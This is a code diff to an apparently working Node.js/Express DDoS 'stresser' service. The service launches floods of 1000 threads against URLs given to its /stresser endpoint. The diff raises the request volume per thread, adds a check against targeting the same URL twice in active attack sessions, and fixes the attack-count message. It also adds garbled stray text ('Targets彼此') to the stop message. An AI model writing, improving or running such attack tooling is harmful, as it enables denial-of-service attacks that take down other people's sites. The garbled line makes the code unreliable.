@@ -12,7 +12,7 @@ app.use(express.json());
 const stateFilePath = path.join(__dirname, "attackState.json");
 
 // Configuration
-const REQUESTS_PER_THREAD = 2; // Number of requests per thread per batch
+const REQUESTS_PER_THREAD = 3; // Number of requests per thread per batch
 const numThreads = 1000; // Number of threads
 let totalRequestsSent = 0; // Counter for total successful requests
 let batchDurations = []; // Array to store batch durations for dynamic estimation
@@ -375,9 +375,21 @@ app.get("/stresser", (req, res) => {
       });
   }
 
+  // Check if the URL is already in an active session
+  const isUrlActive = sessions.some(
+    (session) => session.url === url && Date.now() <= session.startTime + session.duration
+  );
+  if (isUrlActive) {
+    return res
+      .status(400)
+      .json({
+        error: `The URL ${url} is already being targeted in an active attack session.`,
+      });
+  }
+
   res.json({
     message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${
-      REQUESTS_PER_THREAD * 2 * sessions.length
+      REQUESTS_PER_THREAD * 2 * (sessions.length + 1)
     } requests per batch to ${url} and existing targets.`,
   });
   startAttack(url, durationHours);
@@ -393,7 +405,7 @@ app.get("/stop", (req, res) => {
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
   res.json({
-    message: `Attack stopped. Targets: ${sessions
+    message: `Attack stopped. Targets彼此  Targets: ${sessions
       .map((s) => s.url)
       .join(", ")}, Total Requests Sent: ${totalRequestsSent.toLocaleString()}`,
   });
